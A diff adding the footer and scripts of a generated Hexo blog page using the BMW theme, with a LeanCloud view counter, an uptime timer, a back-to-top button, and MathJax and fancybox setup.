+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
